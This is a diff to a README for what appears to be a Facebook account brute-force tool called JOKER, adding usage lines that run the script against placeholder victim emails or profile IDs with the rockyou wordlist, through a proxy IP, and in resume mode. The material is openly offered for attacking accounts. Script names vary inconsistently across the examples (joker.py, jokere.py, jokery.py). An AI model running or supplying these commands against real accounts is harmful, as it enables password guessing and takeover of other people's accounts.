@@ -25,8 +25,24 @@ git clone https://github.com/fikrado/JOKER-burtal-force
 
 cd JOKER-burtal-force
 
-𝙥𝙮𝙩𝙝𝙤𝙣 𝙛𝙗𝙗𝙧𝙪𝙩𝙚.𝙥𝙮
+python joker.py
 
 ```
 ### 
+
+
+
+
+```
+      python joker.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+   
+      python joker.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     
+      python jokere.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129-
+      
+      python jokery.py -t Victim@gmail.com -s 1234567
+     
+      python joker.py -g https://www.facebook.com/Victim_Profile
+     
+```
 <img src="/itl.cat_joker-wallpaper-4k_3130186.png (1).jpg">
